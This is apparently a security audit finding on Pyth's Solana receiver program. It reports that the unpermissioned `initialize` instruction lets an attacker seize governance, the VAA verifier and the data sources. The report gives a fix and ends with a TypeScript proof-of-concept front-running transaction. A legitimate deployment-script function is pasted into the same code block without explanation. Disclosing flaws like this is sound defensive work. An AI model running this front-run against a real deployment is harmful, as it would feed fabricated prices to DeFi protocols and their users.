### Title
Unpermissioned `initialize` Instruction Allows Front-Running of Critical Config — (`File: target_chains/solana/programs/pyth-solana-receiver/src/lib.rs`)

---

### Summary

The `initialize` instruction of the `pyth-solana-receiver` Solana program does not enforce any constraint that the caller is a trusted or known address (such as the program's upgrade authority). Any unprivileged transaction sender can call `initialize` before the legitimate deployer and write an attacker-controlled `Config` to the program's singleton PDA, gaining permanent control over governance, VAA verification, and accepted data sources.

---

### Finding Description

The `Initialize` accounts struct imposes no identity constraint on `payer` beyond requiring a signature:

```rust
#[derive(Accounts)]
#[instruction(initial_config : Config)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub payer: Signer<'info>,
    #[account(init, space = Config::LEN, payer=payer, seeds = [CONFIG_SEED.as_ref()], bump)]
    pub config: Account<'info, Config>,
    pub system_program: Program<'info, System>,
}
``` [1](#0-0) 

The handler unconditionally writes the caller-supplied `initial_config` into the config PDA:

```rust
pub fn initialize(ctx: Context<Initialize>, initial_config: Config) -> Result<()> {
    require!(
        initial_config.minimum_signatures > 0,
        ReceiverError::ZeroMinimumSignatures
    );
    let config = &mut ctx.accounts.config;
    **config = initial_config;
    Ok(())
}
``` [2](#0-1) 

The `Config` struct written by this call controls every security-critical parameter of the receiver:

```rust
pub struct Config {
    pub governance_authority: Pubkey,       // controls all governance actions
    pub target_governance_authority: Option<Pubkey>,
    pub wormhole: Pubkey,                   // address used for VAA verification
    pub valid_data_sources: Vec<DataSource>,// accepted price-update emitters
    pub single_update_fee_in_lamports: u64,
    pub minimum_signatures: u8,             // VAA signature threshold
}
``` [3](#0-2) 

Because the config PDA is derived from a fixed seed (`CONFIG_SEED`) and the `init` constraint prevents re-initialization, whoever calls `initialize` first owns the program permanently. There is no subsequent recovery path without a program upgrade.

The analogous vulnerability exists in `pyth-price-store`: its `initialize` processor also only validates that the payer is a signer, with no check against the upgrade authority, allowing an attacker to register an arbitrary `authority` pubkey that controls all subsequent `InitializePublisher` calls. [4](#0-3) [5](#0-4) 

---

### Impact Explanation

An attacker who front-runs `initialize` on `pyth-solana-receiver` can:

1. **Seize governance authority** — set `governance_authority` to their own key, permanently locking out the legitimate Pyth team from calling `set_data_sources`, `set_fee`, `set_wormhole_address`, `set_minimum_signatures`, or initiating a governance authority transfer.
2. **Substitute a malicious Wormhole address** — set `wormhole` to an attacker-controlled program that approves any VAA, bypassing guardian-set verification entirely.
3. **Inject malicious data sources** — set `valid_data_sources` to attacker-controlled emitters, causing all downstream consumers of `post_update` / `post_update_atomic` to accept fabricated price data.
4. **Reduce the signature threshold** — set `minimum_signatures` to `1`, weakening VAA security to a single compromised guardian.

All downstream protocols that consume Pyth price feeds via `PriceUpdateV2` accounts would receive manipulated prices, enabling oracle manipulation attacks (liquidations, minting, borrowing) across every DeFi protocol integrated with Pyth on Solana.

---

### Likelihood Explanation

The attack window is the gap between program deployment and the first call to `initialize`. On Solana, transactions are publicly visible in the mempool. An attacker monitoring for a newly deployed `pyth-solana-receiver` program ID can submit a competing `initialize` transaction with higher priority fees. The deployment script at `contract_manager/scripts/deploy_solana_programs.ts` shows that initialization is a separate step from deployment, confirming the window exists. [6](#0-5) 

The attack requires no privileged access, no leaked keys, and no social engineering — only the ability to submit a Solana transaction.

---

### Recommendation

Add a constraint to the `Initialize` accounts struct that requires the `payer` to be the program's upgrade authority (the BPF Loader Upgradeable `upgrade_authority` stored in the program's `ProgramData` account). This mirrors the fix applied in the referenced Entangle report:

```rust
#[derive(Accounts)]
#[instruction(initial_config : Config)]
pub struct Initialize<'info> {
    #[account(
        mut,
        constraint = payer.key() == program_data.upgrade_authority_address
            .ok_or(error!(ReceiverError::Unauthorized))?
            @ ReceiverError::Unauthorized
    )]
    pub payer: Signer<'info>,
    #[account(
        seeds = [ID.as_ref()],
        bump,
        seeds::program = bpf_loader_upgradeable::id(),
    )]
    pub program_data: Account<'info, ProgramData>,
    #[account(init, space = Config::LEN, payer=payer, seeds = [CONFIG_SEED.as_ref()], bump)]
    pub config: Account<'info, Config>,
    pub system_program: Program<'info, System>,
}
```

Apply the same fix to `pyth-price-store`'s `Initialize` instruction.

### Proof of Concept

```typescript
// Attacker front-runs pyth-solana-receiver initialization
import * as anchor from "@coral-xyz/anchor";
import { PublicKey, SystemProgram } from "@solana/web3.js";

const attacker = anchor.web3.Keypair.generate();
const [configPda] = PublicKey.findProgramAddressSync(
  [Buffer.from("CONFIG")],
  PYTH_SOLANA_RECEIVER_PROGRAM_ID
);

// Attacker calls initialize with their own governance_authority
// and a malicious wormhole address before the legitimate deployer
await pythSolanaReceiverProgram.methods
  .initialize({
    governanceAuthority: attacker.publicKey,   // attacker owns governance
    targetGovernanceAuthority: null,
    wormhole: attackerControlledWormhole,       // bypasses VAA verification
    validDataSources: [{ chain: 26, emitter: attackerEmitter }], // fake source
    singleUpdateFeeInLamports: new anchor.BN(0),
    minimumSignatures: 1,                       // weakest threshold
  })
  .accounts({
    payer: attacker.publicKey,
    config: configPda,
    systemProgram: SystemProgram.programId,
  })
  .signers([attacker])
  .rpc();

// Legitimate deployer's subsequent initialize call will fail:
// "account already in use" (init constraint on config PDA)
// Attacker now permanently controls the receiver program.

async function initializePythReceiver(
  connection: Connection,
  payer: Keypair,
  wormholeProgramId: PublicKey,
  receiverProgramId: PublicKey,
  vault: Vault,
): Promise<void> {
  const configPda = getConfigPda(receiverProgramId);
  const existingConfig = await connection.getAccountInfo(
    configPda,
    "confirmed",
  );
  console.log("\n=== Initializing pyth receiver ===");
  if (existingConfig !== null) {
    console.log(
      `Pyth receiver already initialized. config=${configPda.toString()}`,
    );
    return;
  }

  const deploymentConfig = getDefaultDeploymentConfig(
    "pro-compatible-production",
  );

  const pythSolanaReceiver = new PythSolanaReceiver({
    connection,
    receiverProgramId,
    wallet: new Wallet(payer),
    wormholeProgramId,
  });

  const signature = await pythSolanaReceiver.receiver.methods
    .initialize({
      governanceAuthority: await vault.getEmitter(),
      minimumSignatures: 3,
      singleUpdateFeeInLamports: new BN(0),
      targetGovernanceAuthority: null,
      validDataSources: [
        {
          chain: deploymentConfig.dataSources[0].emitterChain,
          emitter: new PublicKey(
            Buffer.from(deploymentConfig.dataSources[0].emitterAddress, "hex"),
          ),
        },
      ],
      wormhole: wormholeProgramId,
    })
    .accounts({ config: configPda, payer: payer.publicKey })
    .signers([payer])
    .rpc({ commitment: "confirmed", skipPreflight: true });
  console.log(`Pyth receiver initialized. signature=${signature}`);
}
